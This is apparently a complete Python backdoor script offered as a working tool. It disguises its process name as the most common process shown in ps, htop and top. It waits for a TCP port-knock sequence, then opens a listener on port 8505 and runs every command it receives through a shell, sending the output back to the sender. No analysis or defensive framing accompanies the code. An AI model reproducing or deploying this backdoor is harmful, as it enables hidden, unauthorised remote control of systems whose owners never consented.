#!/usr/bin/python

import sys, os, argparse, socket, subprocess, setproctitle, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from Crypto.Cipher import AES

knock = [2000,2001,2002]
count = 0
conn = ''
addr = ''

def setProcessName(name):
    from ctypes import cdll, byref, create_string_buffer
    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(name) + 1)
    buff.value = name
    libc.prctl(15, byref(buff), 0, 0, 0)

def maskProcess():
    # Gets the most common process name for ps -aux/htop
    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()
    print "The most common process for ps/htop is: {0}".format(commandResult)

    # Masks the process for ps -aux and htop.
    setproctitle.setproctitle(commandResult)

    # Gets the most common process name from top
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    commandResult = command.read()

    # Masks the process for top
    setProcessName(commandResult)
    print "The most common process for top is: {0}".format(commandResult)

def createServer(host, port):
	global conn
	global addr
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serverAddr = (host, port)
	try:
		sock.bind(serverAddr)
	except socket.error as msg:
		sys.exit()

	sock.listen(10)
	conn,addr = sock.accept()

def remoteExecute(pkt):
	global conn
	global addr
	global count
	dstIP = pkt[1].dst
	wnd = pkt[2].window
	if wnd == 4096:
		port = pkt[2].sport
		if port == knock[0]:
			count +=1
		if port == knock[1]:
			count +=1
		if port == knock[2]:
			count +=1
		if count == 3:
			print 'Authenticated!..Establishing Connection..'
			createServer(dstIP, 8505)
	elif count < 3:
		return

def main():
	global conn
	global addr
	maskProcess()
	sniff(count= 5, filter="ip and tcp", prn=remoteExecute)
	while 1:
		data = conn.recv(1024)
		process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		output = process.stdout.read() + process.stderr.read()
		conn.sendall(output)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt, AttributeError:
		print 'Exiting..'
